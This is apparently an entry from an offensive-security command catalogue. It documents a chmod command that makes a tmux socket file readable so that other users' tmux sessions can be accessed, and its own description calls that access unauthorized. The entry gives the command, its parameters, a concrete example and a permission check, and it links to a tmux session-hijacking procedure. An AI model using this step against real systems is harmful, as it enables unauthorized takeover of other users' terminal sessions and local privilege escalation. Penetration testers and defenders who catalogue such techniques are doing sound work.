---
type: command
executor: bash
data: chmod +r /tmp/tmux-$_UID/default
output: null
platforms:
  - Linux
tags:
  - privilege-escalation
  - tmux
verified: true
validated: true
---

# chmod-tmux-socket-readable

## Command

```bash
chmod +r /tmp/tmux-$_UID/default
```

## Description

This command modifies the permissions of a TMUX socket file to add read access for all users, enabling unauthorized access to TMUX sessions. Use this in scenarios where the socket is not already world-readable, such as during local privilege escalation on Linux.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /tmp/tmux-$_UID/default | Path to the TMUX socket file; $_UID is the target user's ID (e.g., 1000) | Yes |
| +r | Adds read permission for others | Yes |

## Examples

### Basic Usage

```bash
chmod +r /tmp/tmux-1000/default
```

### Verify Permissions

```bash
ls -l /tmp/tmux-1000/default
```

## Expected Output

No output on success. Permission change can be verified with ls -l showing 'r--r--r--' or similar for the file.

## Related

- [[procedures/Linux-TMUX-Session-Hijacking]]
- [[commands/set-tmux-socket-env-and-list-sessions]]
